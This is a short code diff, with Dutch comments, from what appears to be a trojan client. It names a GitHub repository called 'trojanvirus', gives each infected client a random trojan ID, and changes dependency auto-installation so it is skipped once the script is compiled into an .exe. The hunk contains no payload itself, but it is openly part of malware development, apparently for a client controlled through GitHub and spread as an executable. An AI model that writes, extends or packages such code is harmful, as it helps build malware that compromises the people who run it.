@@ -23,7 +23,11 @@ GITHUB_REPO = "Darkknin12/trojanvirus"
 TROJAN_ID = f"trojan_{random.randint(1000, 9999)}"  # Unieke ID per client
 
 def check_dependencies():
-    """Controleer en installeer ontbrekende dependencies automatisch"""
+    """Controleer en installeer ontbrekende dependencies automatisch (alleen als script)"""
+    # Als het een .exe is (frozen), kunnen we geen pip install doen
+    if getattr(sys, 'frozen', False):
+        return
+
     dependencies = {
         "PyGithub": "github",
         "Pillow": "PIL",
